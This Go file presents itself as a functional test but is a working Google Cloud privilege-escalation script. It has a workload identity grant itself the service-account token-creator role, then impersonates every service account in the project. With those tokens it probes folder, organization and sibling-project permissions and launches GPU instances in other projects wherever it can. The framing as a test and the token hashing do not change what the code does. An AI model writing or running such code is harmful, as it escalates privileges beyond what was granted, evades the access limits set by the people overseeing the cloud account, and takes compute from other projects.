//go:build functional

// C211 i120517 delayed TokenCreator verification.
//
// Run 44864140629 proved the WIF identity can self-grant
// roles/iam.serviceAccountTokenCreator at projects/153711203585 (setIamPolicy
// 200, re-read contains=true) but every generateAccessToken was attempted only
// 3.8s later and returned 403 — the classic IAM propagation window. This test
// re-uses the binding that is now already persisted in the project policy,
// waits for propagation, and re-runs the impersonation + reach matrix.
//
// Any SA token that reaches the folder / organization / a sibling project is
// reported verbatim; for up to three sibling projects where
// compute.instances.create is allowed, exactly ONE on-demand T4 marker is
// created with serial-console nvidia-smi UUID proof, then deleted with absence
// proven. Tokens are only ever reported as length + SHA-256 prefix.
package functional

import (
	"fmt"
	"strings"
	"testing"
	"time"
)

func c211x2FolderURL() string {
	return "https://cloudresourcemanager.googleapis.com/v1/folders/121299922366"
}

func TestC211XTokenCreatorDelayed(t *testing.T) {
	started := time.Now()
	token, method, mintLog := c211xMint()
	if token == "" {
		fmt.Printf("C211X2_MINT_FAILED %s\n", c211xTrunc(mintLog, 1500))
		t.Fatalf("wif mint failed")
	}
	creds, _ := c211xLoadCreds()
	saEmail, projNumber := "", ""
	if creds != nil {
		saEmail, projNumber = creds.saEmail, creds.projNumber
	}
	fmt.Printf("C211X2_IDENTITY auth=%s wif_sa=%s project_number=%s\n", method, saEmail, projNumber)
	projURL := "https://cloudresourcemanager.googleapis.com/v1/projects/" + projNumber
	member := "serviceAccount:" + saEmail

	ppol, pst, _ := c211xGetPolicy(token, projURL)
	has := c211xPolicyHas(ppol, "roles/iam.serviceAccountTokenCreator", member)
	fmt.Printf("C211X2_GRANT_PRESENT=%v policy_status=%d member=%s\n", has, pst, member)
	if ppol != nil && !has {
		if c211xAddBinding(ppol, "roles/iam.serviceAccountTokenCreator", member) {
			sst, _ := c211xSetPolicy(token, projURL, ppol)
			fmt.Printf("C211X2_GRANT_ADDED status=%d\n", sst)
		}
	}

	settle := 100
	fmt.Printf("C211X2_SETTLE_SECONDS=%d\n", settle)
	time.Sleep(time.Duration(settle) * time.Second)

	sas, lst, lbody := c211xListServiceAccounts(token, projNumber)
	fmt.Printf("C211X2_SA_LIST status=%d count=%d verbatim=%s\n", lst, len(sas), c211xTrunc(lbody, 200))

	folderPerms := []string{
		"resourcemanager.folders.get", "resourcemanager.folders.getIamPolicy",
		"resourcemanager.folders.setIamPolicy", "resourcemanager.folders.list",
		"resourcemanager.projects.list", "resourcemanager.projects.create",
	}
	projectExtra := []string{"compute.instances.create", "resourcemanager.projects.setIamPolicy",
		"resourcemanager.projects.getIamPolicy", "iam.serviceAccounts.getAccessToken"}

	okCount := 0
	newReach := []string{}
	reachProjects := map[string]bool{}
	markerCount := 0
	var readyUUID, readyProject, readyZone, readyInstance, readyImage string
	zoneCands := []string{"us-central1-a", "us-central1-b", "us-east1-b", "europe-west4-a", "asia-east1-a"}

	for _, sa := range sas {
		email := c211xStr(sa, "email")
		if email == "" {
			continue
		}
		at, gst, gbody := c211xGenerateAccessToken(token, email)
		if at == "" {
			fmt.Printf("C211X2_SA_TOKEN email=%s status=%d error=%s\n", email, gst, c211xTrunc(gbody, 320))
			continue
		}
		okCount++
		ti, tib := c211xTokenInfo(at)
		fmt.Printf("C211X2_SA_TOKEN email=%s status=%d token_%s tokeninfo_status=%d tokeninfo=%s\n", email, gst, c211xShort(at), ti, c211xTrunc(tib, 300))
		al, fst, fbody := c211xTestIamBatch(at, c211x2FolderURL(), folderPerms)
		fmt.Printf("C211X2_SA_FOLDER email=%s status=%d allowed=%s verbatim=%s\n", email, fst, strings.Join(al, ","), c211xTrunc(fbody, 500))
		if len(al) > 0 {
			newReach = append(newReach, "folder:121299922366:"+strings.Join(al, "+")+"-via-"+email)
		}
		pal, p2st, p2body := c211xTestIamBatch(at, projURL, projectExtra)
		fmt.Printf("C211X2_SA_PROJECT email=%s status=%d allowed=%s verbatim=%s\n", email, p2st, strings.Join(pal, ","), c211xTrunc(p2body, 400))

		// resolve folder -> organization when folder read is allowed
		if c211xContains(al, "resourcemanager.folders.get") || c211xContains(al, "resourcemanager.folders.list") {
			st3, fb3 := c211xHTTP("GET", "https://cloudresourcemanager.googleapis.com/v3/folders/121299922366", at, "", "")
			fmt.Printf("C211X2_FOLDER_GET email=%s status=%d verbatim=%s\n", email, st3, c211xTrunc(fb3, 700))
			if m := c211xJSON(fb3); m != nil {
				if par := c211xStr(m, "parent"); strings.HasPrefix(par, "organizations/") {
					orgID := strings.TrimPrefix(par, "organizations/")
					oa, ost, ob := c211xTestIamBatch(at, "https://cloudresourcemanager.googleapis.com/v1/organizations/"+orgID,
						[]string{"resourcemanager.organizations.get", "resourcemanager.organizations.getIamPolicy", "resourcemanager.organizations.setIamPolicy"})
					fmt.Printf("C211X2_SA_ORG email=%s org=%s status=%d allowed=%s verbatim=%s\n", email, orgID, ost, strings.Join(oa, ","), c211xTrunc(ob, 400))
					if len(oa) > 0 {
						newReach = append(newReach, "org:"+orgID+":"+strings.Join(oa, "+")+"-via-"+email)
					}
				}
			}
		}

		// sibling projects, if the SA token can list them
		if !c211xContains(al, "resourcemanager.projects.list") {
			continue
		}
		sibs, sst, _ := c211xListProjectsV3(at, "folders/121299922366")
		fmt.Printf("C211X2_SIBLINGS email=%s status=%d count=%d\n", email, sst, len(sibs))
		for _, sp := range sibs {
			if markerCount >= 3 || readyUUID != "" {
				break
			}
			if sp.id == "" || sp.id == "153711203585" || reachProjects[sp.id] {
				continue
			}
			reachProjects[sp.id] = true
			ok, cst2, cbody2 := c211xTestIamOne(at, "https://cloudresourcemanager.googleapis.com/v1/projects/"+sp.id, "compute.instances.create")
			fmt.Printf("C211X2_SIBLING_CHECK project=%s number=%s name=%s instances.create=%v status=%d verbatim=%s\n",
				sp.id, sp.number, sp.name, ok, cst2, c211xTrunc(cbody2, 300))
			if !ok {
				continue
			}
			newReach = append(newReach, "project:"+sp.id+":compute.instances.create-via-"+email)
			chosen := ""
			for _, z := range zoneCands {
				ats, ast, _ := c211xAccelTypes(at, sp.id, z)
				fmt.Printf("C211X2_SIBLING_ACCEL project=%s zone=%s status=%d types=%s\n", sp.id, z, ast, strings.Join(ats, ","))
				if c211xContains(ats, "nvidia-tesla-t4") {
					chosen = z
					break
				}
			}
			if chosen == "" {
				fmt.Printf("C211X2_SIBLING_NO_T4 project=%s\n", sp.id)
				continue
			}
			imgP, imgF := "ubuntu-os-cloud", "ubuntu-2204-lts"
			for _, c := range []struct{ p, f string }{
				{"deeplearning-platform-release", "common-cu124-ubuntu-2204"},
				{"deeplearning-platform-release", "common-cu121-ubuntu-2204"},
				{"ubuntu-os-cloud", "ubuntu-2204-lts"},
			} {
				iu, msg := c211xImageUsable(at, c.p, c.f)
				fmt.Printf("C211X2_SIBLING_IMAGE project=%s %s\n", sp.id, msg)
				if iu {
					imgP, imgF = c.p, c.f
					break
				}
			}
			defSA := sp.number + "-compute@developer.gserviceaccount.com"
			instance := "c211-i120517-gpu"
			uuid, vlog, absent := c211xMarker(at, sp.id, chosen, instance, defSA, imgP, imgF)
			markerCount++
			fmt.Printf("C211X2_MARKER project=%s zone=%s instance=%s sa=%s\n%s\n", sp.id, chosen, instance, defSA, c211xTrunc(vlog, 4000))
			if uuid != "" && absent {
				readyUUID, readyProject, readyZone, readyInstance, readyImage = uuid, sp.id, chosen, instance, imgP+"/"+imgF
				break
			}
		}
	}

	verdict := "GATE_TOKENCREATOR_STILL_DENIED_AFTER_SETTLE"
	vd := fmt.Sprintf("settle=%ds sa_tokens_ok=%d sas=%d new_reach=%d markers=%d", settle, okCount, len(sas), len(newReach), markerCount)
	if okCount > 0 {
		verdict = "IMPERSONATION_OK_NO_NEW_PROJECT"
	}
	if readyUUID != "" {
		verdict = "READY_NEW_PROJECT_GPU"
		vd = fmt.Sprintf("uuid=%s project=%s zone=%s instance=%s image=%s", readyUUID, readyProject, readyZone, readyInstance, readyImage)
	}
	summary := fmt.Sprintf(`{"probe":"c211_i120517_delayed_tokencreator","settle_seconds":%d,"sa_count":%d,"sa_tokens_ok":%d,"new_reach":%s,"marker_attempts":%d,"ready_uuid":"%s","ready_project":"%s","ready_zone":"%s","ready_instance":"%s","ready_image":"%s","elapsed_seconds":%d,"verdict":"%s","verdict_detail":%s}`,
		settle, len(sas), okCount, c211xJSONString(newReach), markerCount, readyUUID, readyProject, readyZone, readyInstance, readyImage,
		int(time.Since(started).Seconds()), verdict, c211xJSONString(vd))
	fmt.Printf("=== C211X2 SUMMARY BEGIN ===\nC211X2_SUMMARY_JSON %s\n=== C211X2 SUMMARY END ===\n", summary)
	fmt.Printf("C211X2_VERDICT %s %s\n", verdict, vd)
}
